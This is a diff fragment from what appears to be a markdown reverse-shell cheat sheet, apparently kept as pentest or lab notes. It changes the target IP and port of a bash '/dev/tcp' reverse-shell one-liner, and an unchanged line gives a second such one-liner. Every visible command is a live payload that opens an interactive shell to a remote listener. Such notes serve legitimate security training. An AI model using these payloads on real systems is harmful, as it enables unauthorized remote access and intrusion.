@@ -5,7 +5,7 @@ tags:
 ---
 ## bash:
 ```sh
-/usr/bin/bash -i >& /dev/tcp/10.10.200.85/1337 0>&1
+/usr/bin/bash -i >& /dev/tcp/192.168.90.194/4444 0>&1
 bash -c /bin/bash -i >& /dev/tcp/10.10.200.85/9001 0>&1
 ```
 ## rm:
